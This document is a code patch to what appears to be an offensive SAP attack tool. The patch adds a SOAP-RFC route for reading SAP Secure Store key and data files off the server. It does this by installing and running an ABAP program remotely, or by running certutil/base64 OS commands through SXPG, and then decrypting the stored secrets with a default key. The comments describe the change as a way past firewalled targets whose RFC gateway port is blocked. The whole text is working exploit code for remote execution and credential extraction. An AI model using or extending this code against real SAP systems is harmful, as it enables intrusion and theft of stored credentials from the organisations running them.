@@ -378,69 +378,80 @@ _ABAP_READ_SSFS_FILES = [
 ]
 
 
-def _read_ssfs_files_via_abap(node, creds) -> tuple:
+def _read_ssfs_files_via_abap(node, creds,
+                               soap_session=None) -> tuple:
     """Read SSFS KEY and DAT files from the SAP OS via RFC_ABAP_INSTALL_AND_RUN.
 
     Returns (key_bytes, dat_bytes) — either or both may be None if not available.
+
+    Phase 3b: when ``soap_session`` is supplied, routes the ABAP
+    OPEN DATASET program over SOAP-RFC instead of pyrfc → eliminates
+    the 60s pyrfc-on-3340 timeout on firewalled HTTP-only targets.
     """
     import base64
 
     try:
-        with sapmap_rfc._get_connection(node, creds) as conn:
-            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_SSFS_FILES,
-                                                "ZSECSSFS")
-            if not res.get("success"):
-                print(f"[-] {node.sid} client {creds.client}: "
-                      f"SSFS file read failed: {res.get('error')}")
-                return None, None
+        if soap_session is not None:
+            res = soap_session.install_and_run(
+                _ABAP_READ_SSFS_FILES, "ZSECSSFS")
+        else:
+            with sapmap_rfc._get_connection(node, creds) as conn:
+                res = sapmap_rfc._run_abap_program(
+                    conn, _ABAP_READ_SSFS_FILES, "ZSECSSFS")
 
-            output = res.get("output", [])
-            key_b64_parts = []
-            dat_b64_parts = []
+        if not res.get("success"):
+            client_label = creds.client if creds else "?"
+            print(f"[-] {node.sid} client {client_label}: "
+                  f"SSFS file read failed: {res.get('error')}")
+            return None, None
 
-            for line in output:
-                if line.startswith("~~~KEYERR"):
-                    err = line.split(None, 1)[1] if " " in line else line
-                    print(f"[*] SSFS KEY file not accessible: {err}")
-                elif line.startswith("~~~KEYLEN"):
-                    klen = line.split(None, 1)[1].strip() if " " in line else "?"
-                    print(f"[*] SSFS KEY file: {klen} base64 chars")
-                elif line.startswith("~~~K"):
-                    key_b64_parts.append(line[4:].strip())
-                elif line.startswith("~~~DATERR"):
-                    err = line.split(None, 1)[1] if " " in line else line
-                    print(f"[*] SSFS DAT file not accessible: {err}")
-                elif line.startswith("~~~DATLEN"):
-                    dlen = line.split(None, 1)[1].strip() if " " in line else "?"
-                    print(f"[*] SSFS DAT file: {dlen} base64 chars")
-                elif line.startswith("~~~D"):
-                    dat_b64_parts.append(line[4:].strip())
+        output = res.get("output", [])
+        key_b64_parts = []
+        dat_b64_parts = []
 
-            key_bytes = None
-            dat_bytes = None
+        for line in output:
+            if line.startswith("~~~KEYERR"):
+                err = line.split(None, 1)[1] if " " in line else line
+                print(f"[*] SSFS KEY file not accessible: {err}")
+            elif line.startswith("~~~KEYLEN"):
+                klen = line.split(None, 1)[1].strip() if " " in line else "?"
+                print(f"[*] SSFS KEY file: {klen} base64 chars")
+            elif line.startswith("~~~K"):
+                key_b64_parts.append(line[4:].strip())
+            elif line.startswith("~~~DATERR"):
+                err = line.split(None, 1)[1] if " " in line else line
+                print(f"[*] SSFS DAT file not accessible: {err}")
+            elif line.startswith("~~~DATLEN"):
+                dlen = line.split(None, 1)[1].strip() if " " in line else "?"
+                print(f"[*] SSFS DAT file: {dlen} base64 chars")
+            elif line.startswith("~~~D"):
+                dat_b64_parts.append(line[4:].strip())
 
-            if key_b64_parts:
-                try:
-                    key_bytes = base64.b64decode("".join(key_b64_parts))
-                    print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
-                except Exception as e:
-                    print(f"[-] SSFS KEY base64 decode failed: {format_rfc_exception(e)}")
+        key_bytes = None
+        dat_bytes = None
 
-            if dat_b64_parts:
-                try:
-                    dat_bytes = base64.b64decode("".join(dat_b64_parts))
-                    print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
-                except Exception as e:
-                    print(f"[-] SSFS DAT base64 decode failed: {format_rfc_exception(e)}")
+        if key_b64_parts:
+            try:
+                key_bytes = base64.b64decode("".join(key_b64_parts))
+                print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
+            except Exception as e:
+                print(f"[-] SSFS KEY base64 decode failed: {format_rfc_exception(e)}")
 
-            return key_bytes, dat_bytes
+        if dat_b64_parts:
+            try:
+                dat_bytes = base64.b64decode("".join(dat_b64_parts))
+                print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
+            except Exception as e:
+                print(f"[-] SSFS DAT base64 decode failed: {format_rfc_exception(e)}")
+
+        return key_bytes, dat_bytes
 
     except Exception as e:
         print(f"[-] SSFS file read error: {format_rfc_exception(e)}")
         return None, None
 
 
-def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
+def _read_ssfs_files_via_sxpg(node, creds, soap_route=None) -> tuple:
     """Read SSFS KEY and DAT files via SXPG OS commands (no ABAP exec needed).
 
     Fallback when RFC_ABAP_INSTALL_AND_RUN is blocked by SCC4.  Uses
@@ -449,6 +460,12 @@ def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
 
     Windows: certutil -encode <file> <tmpfile> && type <tmpfile>
     Linux:   base64 <file>
+
+    Phase 3b: when ``soap_route`` is supplied, routes the SXPG calls
+    through execute_os_command (which dispatches to SOAP-RFC when the
+    gateway port is unreachable) instead of raw pyrfc.  The
+    create_tcpip_destination path that hangs on 3340 is bypassed
+    entirely on HTTP-only targets.
 
     Returns (key_bytes, dat_bytes) — either or both may be None.
     """
@@ -498,7 +515,14 @@ def _read_ssfs_files_via_sxpg(node, creds) -> tuple:
                 cmd = "base64"
                 params = fpath
 
-            result = sapmap_rfc.execute_local_command(node, cmd, params, creds)
+            # Route through execute_os_command — SOAP-RFC fallback
+            # kicks in when soap_route is set AND gateway 33NN is
+            # unreachable.  For non-firewalled targets this is the
+            # same SXPG-via-pyrfc path execute_local_command was.
+            import sapmap_exploit
+            result = sapmap_exploit.execute_os_command(
+                node, cmd, params, creds=creds,
+                soap_route=soap_route, prefer="sxpg")
             if not result.get("success") or not result.get("output"):
                 continue
 
@@ -966,7 +990,8 @@ def _ensure_user_in_client(node, current_creds, target_client, state=None):
 # ---------------------------------------------------------------------------
 
 def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
-                         state=None, soap_session=None) -> list:
+                         state=None, soap_session=None,
+                         soap_route=None) -> list:
     """
     Read and decrypt SAP Secure Store entries.
 
@@ -991,7 +1016,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
 
     # --- Step 1: Try to read SSFS files from OS ---
     print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
-    key_bytes, dat_bytes = _read_ssfs_files_via_abap(node, creds)
+    key_bytes, dat_bytes = _read_ssfs_files_via_abap(
+        node, creds, soap_session=soap_session)
 
     # Detect "not permitted" error — SSFS read uses ABAP exec
     if key_bytes is None and dat_bytes is None:
@@ -999,7 +1025,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
         # --- Step 1b: SXPG fallback for SSFS files ---
         # SXPG doesn't need ABAP exec — it runs OS commands via sapxpg
         print(f"[*] {node.sid}: ABAP exec failed for SSFS, trying SXPG fallback...")
-        key_bytes, dat_bytes = _read_ssfs_files_via_sxpg(node, creds)
+        key_bytes, dat_bytes = _read_ssfs_files_via_sxpg(
+            node, creds, soap_route=soap_route)
 
     # Extract SSFS master key from KEY file (if available)
     ssfs_key = None
